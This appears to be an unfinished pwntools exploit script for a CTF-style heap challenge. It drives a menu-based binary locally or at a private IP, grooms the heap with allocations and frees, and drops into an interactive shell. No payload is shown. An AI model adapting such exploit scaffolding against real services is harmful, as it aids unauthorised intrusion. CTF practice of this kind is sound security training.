from pwn import *
context(os='linux',arch='amd64',aslr = 'False')#,log_level='debug')
local = 1
#log_level='debug'
if local:
	p = process("./pwn")#,env={'LD_PRELOAD':'./libc_x64.so.6'})
	elf = ELF("./pwn")
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	#p = remote('192.168.210.11',11006)
	p = remote('172.29.20.112',9999)
	elf = ELF("./pwn")
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def new(size,content):
    p.recvuntil("choice:")
    p.sendline("1")
    p.recvuntil("?>")
    p.sendline(str(size))
    p.recvuntil("content:")
    p.sendline(content)

def new0():
    p.recvuntil("choice:")
    p.sendline("1")
    p.recvuntil("?>")
    p.sendline(str(0))

def edit(index,content):
    p.recvuntil("choice:")
    p.sendline("2")
    p.recvuntil("Index:")
    p.sendline(str(index))
    p.recvuntil("content:")
    p.sendline(content)
def show(index):
    p.recvuntil("choice:")
    p.sendline("3")
    p.recvuntil("Index:")
    p.sendline(str(index))
def delete(index):
    p.recvuntil("choice:")
    p.sendline("4")
    p.recvuntil("Index:")
    p.sendline(str(index))

'''
bb 0xCF2
bb 0xE17
bb 0x100D
'''
def exp():
	new(0xa0,"AAAA")
	new(0xa0,"AAAA")
	new(0xa0,"AAAA") #2
	new(0xa0,"AAAA")
	delete(2)
	delete(1)
	new0()
pause()	
exp()
p.interactive()
